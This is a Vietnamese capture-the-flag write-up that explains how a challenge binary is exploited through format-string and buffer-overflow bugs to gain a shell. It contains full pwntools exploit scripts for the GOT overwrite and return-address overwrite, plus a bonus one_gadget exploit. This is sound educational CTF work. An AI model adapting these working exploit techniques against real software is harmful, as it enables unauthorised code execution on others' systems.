# task_outside
# RET2WIN OR FMT ???

***Author : @Wan***

ida:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/19135599-2c8d-4277-bf8e-81abfe2a6827)


**ngay hàm main đã có lỗi fmt và bof rồi**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/a4d0c373-7bbb-473d-9201-d46a87c2d91f)


tại hàm fmt có thêm lỗi fmt nữa 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/5f93d469-0c6f-4339-a3c6-333010f2641b)


**tại hàm exit có dấu /bin/sh trong exit_code**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/3e05c645-e0fa-4bf3-a1b4-76eae51e15d1)


chà chà căng đó


checks:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/61aab881-852c-4e20-8f4c-6f8c6689ff09)



**cả canary lẫn relro đều tắt, bài này có thú vị đây** 

có khá nhiều dữ liệu ta cần khai thác, nên ta giờ ta sẽ vào những cái đơn giản nhất 

tại hàm **main** có lỗi **BOF** nên ta có thể **ret2win** vào **hàm fmt** để tiếp tục khai thác, **nhưng PIE mở nên ta cần leak địa chỉ exe trước**

```python

##################################
### Stage 1: leak exe  address ###
##################################

p.sendafter(b'ret2win or fmt\n', b'%13$p') 
exe_leak = int(p.recvline()[:-6], 16)
exe.address = exe_leak - 0x1160
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

```

oke h ta sẽ tiếp tục khai thác hàm fmt

tới đây rồi ta sẽ có rất nhiều hướng khai thác khác nhau, mình đã thử qua nhiều cách rồi và ```mình quyết định làm theo cách của author ``` ( **vì những cách khác ko ra :(**   )

**Ý tưởng:**

- **nhìn tổng quan ida thì ta đã thấy có cả system lẫn /bin/sh**, nên tại đây ta sẽ kết hợp giữ **got** và **plt** để giải quyết bài này
- exit có chứa /bin/sh nếu tại đây biến thành system thì ta có được shell rồi, nên ý tưởng đầu tiên ta cần hướng tới là **ow got.exit thành plt.system**
- sau khi ow got.exit thành system xong ta cần trỏ vào hàm exit_f , **tại đây ta ko thể dùng ret2win được vì ko có lỗi BOF**, hmm nên ta nảy số ngay qua cách **ow rip thành địa chỉ của hàm exit_f**
- **để lấy được địa chỉ rip** thì ta cần leak được stack bằng cách khai thác lỗi fmt 

**Tóm tắt**

```( leak exe -> ret2win fmt -> leak stack -> ow exit.got() = system.plt() -> ow ret = exit_f )```

oke bây giờ ta leak stack và rip trước vì nó đơn giản 

```python=

##################################
### Stage 3:leak stack and ret ###
##################################

p.sendlineafter(b'phai lam gi day?????\n', b'%17$p') 
stack_leak = int(p.recvline()[:-1], 16)
ret = stack_leak - 0x100
log.info("stack leak: " + hex(stack_leak))
log.info("ret: " + hex(ret))

```

tới đây ta đây ta **ow got.exit thành plt system**

```lý do tại sao dùng plt mà ko phải got cho system:```


![image](https://github.com/gookoosss/CTF.-/assets/128712571/6a8bcf96-ff6d-48dc-a1f2-b5b7d3f0892d)


**hiểu hiểu đơn giản được là để thực thi được system thì cần dùng plt, got chỉ là địa chỉ chứa plt , còn muốn thực thi được thì phải dùng plt** 


tại đây ta sẽ lặp 6 lần từng byte 1 để debug cho dễ

```python
#############################################
### Stage 4: ow exit.got() = system.plt() ###
#############################################

system = exe.plt['system'] #plt.system
exit = exe.got['exit'] #got.ext

log.info("system: " + hex(system))

# in từ từ 1byte

for i in range(0,6):
    payload = f"%{system & 0xff}c%8$hhn".encode().ljust(16, b"\0")
    payload += p64(exit) 
    p.sendlineafter(b'phai lam gi day?????\n', payload )
    system = system >> 8
    exit += 1
    log.info("system: " + hex(system))

```

**cuối cùng ta ow rip thành địa chỉ hàm exit_f tương tư như trên là xong:**


```python=

################################
### Stage 5: ow ret = exit_f ###
#################################

exit_f = exe.sym['exit_f'] + 5

for i in range(0,6):
    payload = f"%{exit_f & 0xff}c%8$hhn".encode().ljust(16, b"\0")
    payload += p64(ret) 
    p.sendlineafter(b'phai lam gi day?????\n', payload )
    exit_f = exit_f >> 8
    ret += 1
    log.info("exit_f: " + hex(exit_f))


p.sendlineafter(b'phai lam gi day?????\n', b"a"*15 ) # à tại đây nhập quá 12byte để out vòng lặp qua return nha
```

lấy được shell rồi nè :

![image](https://github.com/gookoosss/CTF.-/assets/128712571/e0e2190c-c2f0-4aa4-af63-36663e7aa565)


**script:**

```python 

from pwn import *

p = process('./chall_patched')
exe = ELF('./chall_patched')
libc = ELF('./libc6_2.35-0ubuntu3.1_amd64.so')

gdb.attach(p, gdbscript = '''
b*main+76
b*main+140
b*fmt+61
c
''')

input()

##################################
### Stage 1: leak exe  address ###
##################################

p.sendafter(b'ret2win or fmt\n', b'%13$p') 
exe_leak = int(p.recvline()[:-6], 16)
exe.address = exe_leak - 0x1160
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

##################################
### Stage 2: ret2win fmt       ###
##################################

payload = b'a'*72
payload += p64(exe.sym['fmt'] + 5)
p.send(payload)

##################################
### Stage 3:leak stack and ret ###
##################################

p.sendlineafter(b'phai lam gi day?????\n', b'%17$p') 
stack_leak = int(p.recvline()[:-1], 16)
ret = stack_leak - 0x100
log.info("stack leak: " + hex(stack_leak))
log.info("ret: " + hex(ret))

#############################################
### Stage 4: ow exit.got() = system.plt() ###
#############################################

system = exe.plt['system'] #plt.system
exit = exe.got['exit'] #got.ext

log.info("system: " + hex(system))

# in từ từ 1byte

for i in range(0,6):
    payload = f"%{system & 0xff}c%8$hhn".encode().ljust(16, b"\0")
    payload += p64(exit) 
    p.sendlineafter(b'phai lam gi day?????\n', payload )
    system = system >> 8
    exit += 1
    log.info("system: " + hex(system))


################################
### Stage 5: ow ret = exit_f ###
#################################

exit_f = exe.sym['exit_f'] + 5

for i in range(0,6):
    payload = f"%{exit_f & 0xff}c%8$hhn".encode().ljust(16, b"\0")
    payload += p64(ret) 
    p.sendlineafter(b'phai lam gi day?????\n', payload )
    exit_f = exit_f >> 8
    ret += 1
    log.info("exit_f: " + hex(exit_f))


p.sendlineafter(b'phai lam gi day?????\n', b"a"*15 ) # à tại đây nhập quá 12byte để out vòng lặp qua return nha

p.interactive()


```


bonus:

**cách làm ảo ma bằng one_gadget của @hlaan**

```python 

#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6',checksec=False)

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+59
                b*main+76
                b*main+118
                b*main+140
                b*fmt+61
                b*fmt+78
                b*fmt+139
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('localhost', 30507)
else:
        p = process(exe.path)

GDB()

payload = b'%13$p|%15$p'

sa(b'fmt\n',payload)

exe_leak = int(p.recvuntil(b'|',drop=True),16)
exe.address = exe_leak - 0x1160

info("exe leak: " + hex(exe_leak))
info("exe base: " + hex(exe.address))

libc_leak = int(p.recv(14),16)
libc.address = libc_leak - 0x29d90
info("libc leak: " + hex(libc_leak))
info("libc base: " + hex(libc.address))

system = exe.sym['system']
info("system: " + hex(system))

gadget = libc.address + 0xebcf1

payload = b'A'*64
payload += p64(exe.address + 0x3a00)
payload += p64(gadget)

sa(b'8==D\n',payload)

p.interactive()


```
